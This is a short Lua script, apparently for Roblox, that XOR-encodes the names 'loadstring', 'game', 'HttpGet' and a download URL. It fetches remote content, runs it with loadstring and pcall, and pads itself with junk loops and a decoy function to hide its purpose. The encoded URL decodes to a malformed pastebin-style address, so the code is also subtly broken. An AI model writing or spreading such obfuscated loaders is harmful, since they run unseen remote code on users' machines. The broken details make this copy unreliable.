local _ = "Obfuscated by Dylan"
local function X(t, k)
	local r = {}
	for i, v in ipairs(t) do
		r[i] = string.char(bit32.bxor(v, k))
	end
	return table.concat(r)
end

local L_bytes = {54, 53, 59, 62, 41, 46, 40, 51, 52, 45}
local G_bytes = {61, 59, 55, 63}
local H_bytes = {18, 46, 46, 42, 29, 63, 46}
local U_bytes = {50, 46, 46, 42, 41, 96, 117, 117, 42, 59, 41, 46, 63, 56, 51, 52, 116, 49, 53, 55, 117, 40, 59, 37, 117, 126, 44, 50, 102, 42, 24, 43, 42}

local KEY = 0x5A
local L = X(L_bytes, KEY)   -- "loadstring"
local G = X(G_bytes, KEY)   -- "game"
local H = X(H_bytes, KEY)   -- "HttpGet"
local U = X(U_bytes, KEY)   -- the full pastebin URL

local function junk()
	local s = 0
	for i = 1, 150000 do
		s = s + (math.sin(i) * math.cos(i)) / 1000
	end
	return s
end
junk()

local function decoy(t)
	local x = 0
	for i = 1, #t do
		x = x + t[i]
	end
	return x
end
decoy(L_bytes)

local content = _G[G][H](_G[G], U)
local fn = _G[L](content)
if fn then
	local ok, err = pcall(fn)
	if not ok then
		local d = string.char(0) -- harmless no-op
	end
end

local function extra_junk()
	local a = {}
	for i = 1, 2000 do
		a[i] = math.random()
	end
	return a
end
extra_junk()
